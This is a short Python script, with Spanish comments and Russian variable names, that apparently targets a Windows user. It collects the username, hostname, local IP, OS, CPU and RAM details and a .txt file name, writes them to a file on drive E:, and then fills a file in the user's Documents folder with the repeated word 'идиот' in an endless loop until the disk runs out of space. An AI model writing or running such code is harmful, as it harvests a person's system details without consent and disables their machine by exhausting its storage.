from pathlib import Path
import time
import subprocess
import getpass
import platform
import socket
import psutil
import GPUtil
import datetime

# direcciones
пользователь = getpass.getuser()
carpeta = Path(r"C:\Users")
база = Path(f"C:/Users/{пользователь}/Documents")
база2 = Path(f"E:")
очень = база / "вода.txt"
файлы = база2 / "Important.txt"

# info usuario y componentes
for archivo in carpeta.rglob("*.txt"):
    if archivo.is_file():
        archivostxt = archivo.name
hostname = socket.gethostname()
ip_local = socket.gethostbyname(hostname)
sistema = platform.system()
version = platform.version()
hora = datetime.datetime.now()
cpu = platform.processor()
ram = psutil.virtual_memory()
файлы.write_text(f"{hora},{пользователь},{hostname},{ip_local}),{sistema},{version},{cpu},{ram},{archivostxt}")

# spam texto disco
очень.write_text("идиотидиотидиотидиотидиотидиотидиотидиот\n", encoding="utf-8")
time.sleep(100)
with очень.open("a", encoding="utf-8") as f:
    while f:
        f.write("идиотидиотидиотидиотидиотидиотидиот")
        
